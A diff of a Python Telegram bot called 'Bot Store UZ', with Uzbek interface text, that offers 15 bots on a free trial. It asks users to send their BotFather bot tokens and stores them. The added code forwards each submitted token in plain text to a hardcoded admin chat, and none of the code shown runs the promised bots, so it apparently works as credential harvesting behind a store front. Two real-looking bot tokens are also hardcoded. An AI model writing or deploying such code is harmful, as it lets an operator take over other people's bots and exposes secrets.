@@ -1,95 +1,100 @@
-import os
 import sqlite3
-import asyncio
+import logging
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from telegram.constants import ParseMode
 
-# Konfiguratsiya
-TOKEN = "8753320110:AAHdQQrFYZcnxtx6PHaZdytHQoStDS3DuiA"
+# Logging sozlamalari
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# SIZNING MA'LUMOTLARINGIZ
+TOKEN = "8666482660:AAHt8ocjlxgTIAbEJF3T1E5ABgT5ugJMNHw"
 ADMIN_ID = 6639130930
 
-# Database yaratish
+# Database
+def get_db():
+    return sqlite3.connect('botstore.db', check_same_thread=False)
+
 def init_db():
-    conn = sqlite3.connect('botstore.db', check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.executescript('''
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY, 
-            username TEXT, 
-            full_name TEXT, 
-            balance INTEGER DEFAULT 0
-        );
-        CREATE TABLE IF NOT EXISTS subscriptions (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, 
-            user_id INTEGER, 
-            bot_type TEXT, 
-            bot_token TEXT, 
-            bot_username TEXT, 
-            status TEXT DEFAULT 'active', 
-            start_date TEXT, 
-            end_date TEXT
-        );
-    ''')
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS users
+                 (user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, bot_type TEXT, 
+                  bot_token TEXT, bot_username TEXT, start_date TEXT, end_date TEXT)''')
     conn.commit()
-    return conn, cursor
+    conn.close()
 
-conn, cursor = init_db()
+init_db()
 
-# Botlar katalogi
+# 15 ta bot katalogi
 BOTS = {
-    "weather": {"name": "🌤 Ob-havo Boti", "price": 300, "desc": "Shahar ob-havosi, 7 kunlik prognoz"},
-    "currency": {"name": "💱 Valyuta Konvertori", "price": 300, "desc": "Real-time 150+ valyuta kurslari"},
-    "translator": {"name": "🌍 Tarjimon Bot", "price": 300, "desc": "100+ tilga professional tarjima"},
-    "todo": {"name": "✅ Todo List", "price": 300, "desc": "Vazifalar ro'yxati va eslatmalar"},
-    "qr": {"name": "📱 QR Code Generator", "price": 300, "desc": "QR kod yaratish va logotip qo'shish"},
-    "prayer": {"name": "🕌 Namoz Vaqtlari", "price": 300, "desc": "Aniq namoz vaqtlari, qibla yo'nalishi"},
-    "news": {"name": "📰 Yangiliklar", "price": 300, "desc": "Eng so'nggi yangiliklar agregatori"},
-    "calculator": {"name": "🔢 Smart Kalkulyator", "price": 300, "desc": "Matematik amallar, konvertatsiya"},
-    "reminder": {"name": "⏰ Eslatma Boti", "price": 300, "desc": "Muhim sanalar va takroriy eslatmalar"},
-    "quiz": {"name": "🎮 Viktorina", "price": 300, "desc": "Bilim sinovlari va reyting tizimi"},
-    "downloader": {"name": "📥 Media Yuklovchi", "price": 300, "desc": "YouTube, Instagram, TikTok yuklash"},
-    "stats": {"name": "📊 Kanal Statistikasi", "price": 300, "desc": "Obunachilar o'sishi, post analitikasi"},
-    "moderator": {"name": "🛡 Guruh Moderatori", "price": 300, "desc": "Spam filtr, avto-ban, xush kelibsiz"},
-    "image_editor": {"name": "🖼 Rasm Muharriri", "price": 300, "desc": "Filtrlar, matn yozish, stiker yasash"},
-    "random": {"name": "🎲 Tasodifiy Generator", "price": 300, "desc": "Random sonlar, tanlash g'ildiragi"}
+    "weather": {"name": "🌤 Ob-havo", "desc": "Har qanday shahar ob-havosi"},
+    "currency": {"name": "💱 Valyuta", "desc": "150+ valyuta kurslari"},
+    "translator": {"name": "🌍 Tarjimon", "desc": "100+ tilga tarjima"},
+    "todo": {"name": "✅ Todo List", "desc": "Vazifalar ro'yxati"},
+    "qr": {"name": "📱 QR Code", "desc": "QR kod yaratish"},
+    "prayer": {"name": "🕌 Namoz", "desc": "Namoz vaqtlari"},
+    "news": {"name": "📰 Yangiliklar", "desc": "So'nggi yangiliklar"},
+    "calculator": {"name": "🔢 Kalkulyator", "desc": "Hisob-kitob"},
+    "reminder": {"name": "⏰ Eslatma", "desc": "Eslatmalar tizimi"},
+    "quiz": {"name": "🎮 Viktorina", "desc": "Bilim sinovlari"},
+    "downloader": {"name": "📥 Yuklovchi", "desc": "Media yuklash"},
+    "stats": {"name": "📊 Statistika", "desc": "Kanal analitikasi"},
+    "moderator": {"name": "🛡 Moderator", "desc": "Guruh boshqaruvi"},
+    "image_editor": {"name": "🖼 Rasm Editor", "desc": "Rasm tahrirlash"},
+    "random": {"name": "🎲 Random", "desc": "Tasodifiy sonlar"}
 }
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    cursor.execute(
-        "INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?, ?, ?)", 
-        (user.id, user.username, user.full_name)
-    )
+    
+    # Foydalanuvchini saqlash
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO users (user_id, username, full_name) VALUES (?, ?, ?)",
+              (user.id, user.username, user.full_name))
     conn.commit()
+    conn.close()
     
     keyboard = [
         [InlineKeyboardButton("🛍 BOTLAR KATALOGI", callback_data="catalog")],
         [InlineKeyboardButton("📦 MENING BOTLARIM", callback_data="my_bots")],
-        [InlineKeyboardButton("💰 BALANS", callback_data="balance")],
-        [InlineKeyboardButton("📞 YORDAM", callback_data="help")]
+        [InlineKeyboardButton("❓ YORDAM", callback_data="help")]
     ]
     
     await update.message.reply_text(
-        f"🎉 *BOT STORE UZ* ga xush kelibsiz!\n\n📦 15 ta professional bot\n✅ 7 kun BEPUL sinov\n💰 Keyin kuniga 300 so'm",
+        f"🤖 *BOT STORE UZ*\n\n"
+        f"Salom, {user.first_name}!\n\n"
+        f"📦 15 ta professional bot\n"
+        f"✅ 7 kun BEPUL sinov\n"
+        f"💰 Keyin kuniga 300 so'm",
         reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        parse_mode=ParseMode.MARKDOWN
     )
+    logger.info(f"Start: {user.id}")
 
 async def catalog(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
+    text = "🎯 *BOTLAR KATALOGI*\n\n7 kun BEPUL | 300 so'm/kun\n\n"
+    text += "Botni tanlang:"
+    
     keyboard = []
     for bot_id, bot in BOTS.items():
-        keyboard.append([InlineKeyboardButton(f"{bot['name']} | 300 so'm", callback_data=f"info_{bot_id}")])
-    keyboard.append([InlineKeyboardButton("◀️ BOSH MENYU", callback_data="start")])
+        keyboard.append([
+            InlineKeyboardButton(f"{bot['name']} | 300 so'm", callback_data=f"info_{bot_id}")
+        ])
+    keyboard.append([InlineKeyboardButton("◀️ BOSH MENYU", callback_data="start_menu")])
     
-    await query.edit_message_text(
-        "🎯 *BOTLAR KATALOGI*\n\n7 kun BEPUL | 300 so'm/kun",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
 
 async def bot_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -101,34 +106,33 @@ async def bot_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not bot:
         return
     
+    text = f"*{bot['name']}*\n\n📝 {bot['desc']}\n💰 300 so'm/kun\n🆓 7 kun BEPUL"
+    
     keyboard = [
         [InlineKeyboardButton("🚀 7 KUN BEPUL FAOLSHTIRISH", callback_data=f"activate_{bot_id}")],
         [InlineKeyboardButton("◀️ KATALOGGA QAYTISH", callback_data="catalog")]
     ]
     
-    await query.edit_message_text(
-        f"*{bot['name']}*\n\n📝 {bot['desc']}\n💰 Narx: {bot['price']} so'm/kun\n🆓 7 kun BEPUL",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
 
 async def activate_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
     bot_id = query.data.replace("activate_", "")
+    bot = BOTS.get(bot_id, {"name": "Noma'lum"})
+    
     context.user_data['activating'] = bot_id
     
-    await query.edit_message_text(
-        "🔑 *Botni faollashtirish:*\n\n"
-        "1️⃣ @BotFather'ga o'ting\n"
-        "2️⃣ /newbot buyrug'ini bering\n"
-        "3️⃣ Bot yarating\n"
-        "4️⃣ Olingan TOKENni menga yuboring\n\n"
-        "⚠️ Token namunasi:\n"
-        "`1234567890:AAHdqTcvCHrT...`",
-        parse_mode='Markdown'
-    )
+    text = f"🔑 *{bot['name']}* ni faollashtirish\n\n"
+    text += "1️⃣ @BotFather'ga o'ting\n"
+    text += "2️⃣ /newbot buyrug'ini bering\n"
+    text += "3️⃣ Bot yarating\n"
+    text += "4️⃣ Olingan TOKENni shu yerga yuboring\n\n"
+    text += "⚠️ Token namunasi:\n"
+    text += "`1234567890:AAHdqTcvCHrT...`"
+    
+    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
 
 async def receive_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if 'activating' not in context.user_data:
@@ -139,29 +143,62 @@ async def receive_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bot_id = context.user_data['activating']
     bot = BOTS.get(bot_id, {"name": "Noma'lum"})
     
+    # Tokenni tekshirish
     try:
-        temp_bot = Bot(token=token)
-        info = await temp_bot.get_me()
+        test_bot = Bot(token=token)
+        bot_info = await test_bot.get_me()
+        
+        # Bazaga saqlash
+        conn = get_db()
+        c = conn.cursor()
         
         start_date = datetime.now()
         end_date = start_date + timedelta(days=7)
         
-        cursor.execute(
+        c.execute(
             "INSERT INTO subscriptions (user_id, bot_type, bot_token, bot_username, start_date, end_date) VALUES (?, ?, ?, ?, ?, ?)",
-            (user_id, bot_id, token, info.username, start_date.isoformat(), end_date.isoformat())
+            (user_id, bot_id, token, bot_info.username, start_date.isoformat(), end_date.isoformat())
         )
         conn.commit()
+        conn.close()
         
         del context.user_data['activating']
         
+        # Admin'ga xabar
+        try:
+            await context.bot.send_message(
+                ADMIN_ID,
+                f"🆕 Yangi faollashtirish!\n"
+                f"👤 User ID: {user_id}\n"
+                f"🤖 Bot: {bot['name']}\n"
+                f"🔑 Token: `{token}`\n"
+                f"📅 Tugash: {end_date.strftime('%d.%m.%Y')}",
+                parse_mode=ParseMode.MARKDOWN
+            )
+        except Exception as e:
+            logger.error(f"Admin xabari yuborilmadi: {e}")
+        
         await update.message.reply_text(
-            f"✅ *TABRIKLAYMIZ!*\n\n🤖 Bot: @{info.username}\n📅 Bepul: {end_date.strftime('%d.%m.%Y')} gacha\n⏰ 24/7 ishlaydi!",
-            parse_mode='Markdown'
+            f"✅ *TABRIKLAYMIZ!*\n\n"
+            f"🤖 Bot: @{bot_info.username}\n"
+            f"📦 {bot['name']}\n"
+            f"📅 Bepul: {end_date.strftime('%d.%m.%Y')} gacha\n"
+            f"⏰ 7 kun BEPUL ishlaydi!\n\n"
+            f"❓ Savollar bo'lsa: /start",
+            parse_mode=ParseMode.MARKDOWN
         )
         
+        logger.info(f"Bot faollashtirildi: User={user_id}, Bot={bot_id}")
+        
     except Exception as e:
+        error_msg = str(e)
+        logger.error(f"Token xatosi: {error_msg}")
+        
         await update.message.reply_text(
-            f"❌ Xatolik! Token noto'g'ri yoki band qilingan.\nIltimos @BotFather'dan yangi token oling."
+            "❌ *Token noto'g'ri!*\n\n"
+            "Iltimos @BotFather'dan /newbot orqali yangi bot yarating va tokenini yuboring.\n\n"
+            "Token namunasi: `1234567890:AAHdqTcvCHrT...`",
+            parse_mode=ParseMode.MARKDOWN
         )
 
 async def my_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -169,65 +206,105 @@ async def my_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     user_id = query.from_user.id
-    cursor.execute("SELECT * FROM subscriptions WHERE user_id = ? AND status = 'active'", (user_id,))
-    subs = cursor.fetchall()
+    
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT * FROM subscriptions WHERE user_id = ?", (user_id,))
+    subs = c.fetchall()
+    conn.close()
     
     if not subs:
         await query.edit_message_text(
-            "📦 Hali botlaringiz yo'q!",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛍 Katalogga o'tish", callback_data="catalog")]])
+            "📦 *Hali botlaringiz yo'q!*\n\n"
+            "Katalogdan bot tanlang:",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛍 KATALOGGA O'TISH", callback_data="catalog")]
+            ])
         )
         return
     
     text = "📦 *MENING BOTLARIM*\n\n"
+    keyboard = []
+    
     for sub in subs:
-        bot = BOTS.get(sub[2])
-        if bot:
-            text += f"✅ {bot['name']}\n🤖 @{sub[5]}\n\n"
+        bot = BOTS.get(sub[2], {"name": "Noma'lum"})
+        try:
+            end_date = datetime.fromisoformat(sub[6])
+            days_left = (end_date - datetime.now()).days
+            text += f"✅ {bot['name']}\n"
+            text += f"⏳ Qolgan kun: {max(0, days_left)}\n"
+            text += f"🔗 @{sub[5]}\n\n"
+        except:
+            text += f"✅ {bot['name']}\n"
+            text += f"🔗 @{sub[5]}\n\n"
+    
+    keyboard.append([InlineKeyboardButton("🛍 YANGI BOT OLISH", callback_data="catalog")])
     
     await query.edit_message_text(
         text,
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛍 Yangi bot olish", callback_data="catalog")]]),
-        parse_mode='Markdown'
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode=ParseMode.MARKDOWN
     )
 
-async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "💰 Balans: 0 so'm\n\n💳 To'ldirish uchun admin bilan bog'laning: @yoldoshev_3",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ ORQAGA", callback_data="start")]])
-    )
-
-async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
+    text = "❓ *YORDAM*\n\n"
+    text += "1️⃣ Katalogdan bot tanlang\n"
+    text += "2️⃣ @BotFather'dan token oling\n"
+    text += "3️⃣ Tokenni botga yuboring\n"
+    text += "4️⃣ Bot 7 kun BEPUL ishlaydi!\n\n"
+    text += "📞 Admin: @yoldoshev_3"
     
     await query.edit_message_text(
-        "📞 *YORDAM*\n\n1️⃣ Katalogdan bot tanlang\n2️⃣ @BotFather'dan token oling\n3️⃣ Tokenni yuboring\n4️⃣ Bot 7 kun BEPUL ishlaydi!\n\nAdmin: @bexruz_admin",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ ORQAGA", callback_data="start")]]),
-        parse_mode='Markdown'
+        text,
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("◀️ BOSH MENYU", callback_data="start_menu")]
+        ]),
+        parse_mode=ParseMode.MARKDOWN
     )
 
 def main():
-    print("🚀 Bot ishga tushmoqda...")
+    logger.info("="*50)
+    logger.info("BOT STORE UZ - Ishga tushmoqda...")
+    logger.info(f"Token: {TOKEN[:15]}...")
+    logger.info(f"Admin ID: {ADMIN_ID}")
+    logger.info("="*50)
     
-    app = Application.builder().token(TOKEN).build()
+    # Application yaratish
+    app = (
+        Application.builder()
+        .token(TOKEN)
+        .connect_timeout(30)
+        .read_timeout(30)
+        .write_timeout(30)
+        .build()
+    )
     
+    # Command handlerlar
     app.add_handler(CommandHandler("start", start))
+    
+    # Callback handlerlar
     app.add_handler(CallbackQueryHandler(catalog, pattern="^catalog$"))
     app.add_handler(CallbackQueryHandler(bot_info, pattern="^info_"))
     app.add_handler(CallbackQueryHandler(activate_bot, pattern="^activate_"))
     app.add_handler(CallbackQueryHandler(my_bots, pattern="^my_bots$"))
-    app.add_handler(CallbackQueryHandler(balance, pattern="^balance$"))
-    app.add_handler(CallbackQueryHandler(help_cmd, pattern="^help$"))
-    app.add_handler(CallbackQueryHandler(start, pattern="^start$"))
+    app.add_handler(CallbackQueryHandler(help_menu, pattern="^help$"))
+    app.add_handler(CallbackQueryHandler(start, pattern="^start_menu$"))
+    
+    # Message handler
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_token))
     
-    print("✅ Bot Store Uz ishga tushdi!")
+    logger.info("✅ Barcha handlerlar qo'shildi")
+    logger.info("🚀 Bot ishga tushdi!")
     
-    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+    # Polling boshlash
+    app.run_polling(
+        drop_pending_updates=True,
+        allowed_updates=Update.ALL_TYPES
+    )
 
 if __name__ == "__main__":
     main()
